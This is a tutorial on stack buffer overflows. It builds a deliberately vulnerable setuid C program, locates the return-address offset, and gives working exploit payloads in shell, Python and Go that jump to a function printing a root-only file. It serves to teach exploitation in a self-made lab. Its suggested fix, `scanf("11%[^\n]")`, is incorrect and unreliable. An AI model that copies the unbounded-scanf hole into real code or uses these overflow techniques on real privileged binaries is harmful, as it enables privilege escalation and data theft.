# Return Oriented Programming

## Introduction

When we try to access (read from or write to) a memory address that isn't
actually mapped to our process, the kernel sends a SIGSEGV (Segmentation
Fault), (usually) killing our process.

```c
int main() {
    // create a pointer to the address 0 and dereference it
    *((int*)0) = 0;
}
```

Note that `dmesg` helpfully tells us the position of the instruction pointer
`ip` (henceforth $IP) where the segfault occurred.

```sh
gcc segv.c

./a.out
# Segmentation fault

sudo dmesg
# [ 2342.736665] a.out[758]: segfault at 7f4b9bfea620 ip 00007f4b9bfea620 sp 00007ffdcf0a0778 error 15 in ld-2.31.so[7f4b9bfea000+1000]
```

See here: `segfault at 7f4b9bfea620`.

## The Premise

There is a file `secret.txt` but you cannot read it 😈!

```sh
ls -l
# -rwsr-xr-x 1 root     root     19288 Jun 21 11:33 a.out
# -rw------- 1 root     root        42 Jun 21 10:53 secret.txt
```

However, there is also a `setuid` binary that will spill the file contents,
provided you know a secret passphrase.

```sh
./a.out
# What is the secret phrase?
# red apples
# The secret phrase is not: red apples
```

<details>
<summary>Setup</summary>

```sh
clang exploitable.c
sudo chown root:root a.out
sudo chmod 4755 a.out
echo "NOBODY EXPECTS THE SPANISH INQUISITION!!!" > secret.txt
sudo chown root:root secret.txt
sudo chmod 600 secret.txt
```
</details>

## Buffer Overflow

```c
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <assert.h>
#include <errno.h>
#include <unistd.h>
#include <sys/types.h>

#define SECRET_PHRASE "bed bananas"
#define SECRET_FILE "./secret.txt"

void win() {
    FILE *fd = fopen(SECRET_FILE, "r");
    if (fd == 0) {
        perror(SECRET_FILE);
        return;
    }
    fseek(fd, 0, SEEK_END);
    long sz = ftell(fd);
    fseek(fd, 0, SEEK_SET);
    char *buf = malloc(sz+1);
    fread(buf, sz, 1, fd);
    buf[sz] = 0;
    printf("%s\n", buf);
    return;
}

int main(int argc, char **argv) {
    char pass[12] = {0};
    printf("What is the secret phrase?\n");
    // scanf("11%[^\n]", pass);
    scanf("%[^\n]", pass);
    if (0 == (strncmp(SECRET_PHRASE, pass, sizeof(SECRET_PHRASE)))) {
        win();
    } else {
        printf("The secret phrase is not: %s\n", pass);
    }
    return 0;
}
```

The above code is susceptible to a buffer overflow attack.
`scanf` reads the entire input line into `pass` buffer, input longer than 12
(ASCII) characters will overwrite memory further down the stack
(or memory in higher addresses, since the stack in x86 grows downwards, from
high to low memory addresses).

```c
scanf("%[^\n]", pass);
```

A more correct version would be:

```c
scanf("11%[^\n]", pass);
```

## Stack Canaries

GCC with its default options puts some sort of security check in place.

```sh
gcc exploitable.c
printf 'A%.0s' {1..40} | ./a.out

# What is the secret phrase?
# The secret phrase is not: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
# *** stack smashing detected ***: terminated
# Aborted

sudo dmesg
# [ 3491.530583] a.out[954]: segfault at 7f0041414141 ip 00007f0041414141 sp 00007fffcc4bdc20 error 14 in libc-2.31.so[7f8bfc9c3000+22000]
```

So let's compile with `clang` instead.

## Locating the Return Address

The return address is located somewhere at the bottom of the stack frame.
When returning, the return address is loaded into the $IP register and
execution continues at that address.

ASCII 'A' is hex 0x41:

```sh
clang exploitable.c
printf 'A%.0s' {1..40} | ./a.out

# What is the secret phrase?
# The secret phrase is not: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
# Segmentation fault

sudo dmesg
# [ 3926.193998] a.out[954]: segfault at 7f0041414141 ip 00007f0041414141 sp 00007fffcc4bdc20 error 14 in libc-2.31.so[7f8bfc9c3000+22000]
```

Pay special attention to the line `segfault at 7f0041414141`.

We see $IP filled up from the right with four 'A's.
Considering that we input 40 'A's and four endet up in $IP, the return address
on the stack must lie 40 - 4 = 36 bytes after the input buffer starts.

By playing around with the amount of 'A's we send, we can figure out that the
return address begins after 36 bytes (and ends after the 42nd byte).

```sh
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABCDEFG | ./a.out
# [ 8286.214298] a.out[1977]: segfault at 474645444342 ip 0000474645444342 sp 00007ffcf9383bd0 error 14 in libc-2.31.so[7f03ab870000+22000]
```

Note the 0x47 (G), 0x46 (F), 0x45 (E), ... -- our payload will end up in
reverse order!

<details>
<summary>Tips & Tricks</summary>

Another way is to generate a random string with no repeating patterns.
Then just match the pattern from the $IP against your input string to find
the exact position.
</details>

## Address of the Win Function

To make it easy for us we assume that the binary executable is not "stripped",
meaning that information about function names is still intact.

This is the function we would like to "return" to:

```sh
objdump -d -M intel_syntax a.out

# ... SNIP ...
#
# 00000000004011c0 <win>:
#   4011c0:       55                      push   rbp
#   4011c1:       48 89 e5                mov    rbp,rsp
#   4011c4:       48 83 ec 30             sub    rsp,0x30
#   4011c8:       48 bf 04 20 40 00 00    movabs rdi,0x402004
#   4011cf:       00 00 00
#   4011d2:       48 be 11 20 40 00 00    movabs rsi,0x402011
#   4011d9:       00 00 00
#   4011dc:       e8 bf fe ff ff          call   4010a0 <fopen@plt>
#
# ... SNIP ...
```

We note its address as `0x00000000004011c0`.

## Crafting a Payload

Using Python we can easily craft a malicious input string...

```sh
python2 -c 'print("A" * 36 + "\xc0\x11\x40\x00\x00\x00\x00\x00")'
```

...where `c011400000000000` is the address of the `win` function.

Note that we had to convert the endianness to match that of our CPU.

We use Python 2 because Python 3 makes it us very hard to output an ASCII
string with invalid bytes.

## Ready, Set, Exploit!

```sh
python2 -c 'print("A" * 36 + "\xc0\x11\x40\x00\x00\x00\x00\x00")' | ./a.out
# What is the secret phrase?
# The secret phrase is not: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�@
# NOBODY EXPECTS THE SPANISH INQUISITION!!!
# 
# Segmentation fault
```

As you can see from the output, the `win` function was run, between `main`
returning and a segfault.

## Writing an Exploit

### Python 3

```python
import subprocess

payload = b'A' * 36 + b'\xc0\x11\x40\x00\x00\x00\x00\x00'
process = subprocess.Popen('./a.out', stdin=subprocess.PIPE)
process.communicate(input=payload)
```

Or if you're scared of snakes, try Go:

### Go

```go
package main

import (
	"fmt"
	"io"
	"os"
	"os/exec"
)

func panicIf(err error) {
	if err != nil {
		panic(err)
	}
}

var payload []byte = []byte("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xc0\x11\x40\x00\x00\x00\x00\x00")

func main() {
	fmt.Println(string(payload))

	cmd := exec.Command("./a.out")
	stdin, err := cmd.StdinPipe()
	panicIf(err)
	// redirect child in/out to parent in/out
	cmd.Stdout = os.Stdout
	cmd.Stderr = os.Stderr

	err = cmd.Start()
	panicIf(err)

	io.WriteString(stdin, string(payload))
	stdin.Close() // close stdin to signal end of input

	err = cmd.Wait()
	panicIf(err)
}
```
